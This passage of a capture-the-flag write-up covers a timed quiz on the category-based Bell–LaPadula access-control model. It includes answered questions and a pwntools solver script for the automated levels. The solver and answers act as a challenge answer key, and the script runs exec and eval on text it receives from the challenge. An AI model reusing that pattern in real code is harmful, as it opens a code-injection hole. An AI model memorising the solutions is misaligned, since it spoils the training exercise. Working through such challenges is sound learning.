> Five Mandatory Access Control questions with categories

```shell
In this challenge you'll be answering questions about the category-based Bell–LaPadula model of Mandatory Access Control.

Answer the questions about the model to get the flag.


In this challenge, your goal is to answer 5 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:
4 Levels (first is highest aka more sensitive):
TS
S
C
UC
4 Categories:
ACE
NATO
NUC
UFO
Q 1. Can a Subject with level C and categories {NATO, UFO} write an Object with level C and categories {ACE, UFO}?
no
Correct!
Q 2. Can a Subject with level UC and categories {NATO, UFO} write an Object with level UC and categories {ACE, NATO, UFO}?
yes
Correct!
Q 3. Can a Subject with level C and categories {NATO, NUC, UFO} write an Object with level TS and categories {ACE, NATO}?
no
Correct!
Q 4. Can a Subject with level UC and categories {NUC} write an Object with level TS and categories {NUC}?
yes
Correct!
Q 5. Can a Subject with level TS and categories {NATO, NUC} write an Object with level TS and categories {NATO}?
no
Correct!
Congratulations, you solved this challenge!
```

#### level17
> Automate answering 20 Mandatory Access Control questions with categories in one second

```shell
In this challenge you'll be answering many questions about the category-based Bell–LaPadula model of Mandatory Access Control.

Hint: Use pwntools to interact with this process and answer the questions.
```

```python
from pwn import *
import re

p = process("/challenge/run")

p.recvuntil(b'system:\n')

level_line = p.recvline()
level_number = int(level_line.split(b' ')[0])
level = {}
for i in range(0,level_number):
    level[p.recvline()[:-1].decode()] = i

Categories_line = p.recvline()
Categories_number = int(Categories_line.split(b' ')[0])
for i in range(0,Categories_number):
    Cur_Categories = p.recvline()[:-1].decode()
    exec(Cur_Categories+f" = {i}")

pattern = r"(?:Can a Subject with level )(.*)(?: and categories )({.*})(?: )(.*)(?: an Object with level )(.*)(?: and categories )({.*})?"

def judge(q):
    res = re.findall(pattern,q.decode())
    method = res[0][2]
    level1 = res[0][0]
    level2 = res[0][3]
    cate1 = set(eval(res[0][1]))
    cate2 = set(eval(res[0][4]))

    if(method == 'read'):
        if level[level1] > level[level2]:
            return False
        if not cate2.issubset(cate1):
            return False
        return True

    else:
        if level[level1] < level[level2]:
            return False
        if not cate1.issubset(cate2):
            return False
        return True

while True:
    q = p.recvline()
    print(q.decode(),end = "")
    if b'Congratulations' in q:
        break
    if judge(q):
        print('yes')
        p.sendline(b'yes')
    else:
        print('no')
        p.sendline(b'no')
    feedback = p.recvline()
    if b'Incorrect' in feedback:
        print("error")
        exit(-1)

p.interactive()
```

#### level18
> Automate answering 64 Mandatory Access Control questions with categories in one second

same with levle17
同上

#### level19
> Automate Answering 128 Mandatory Access Control questions with random levels and categories in one second

same with levle17
同上
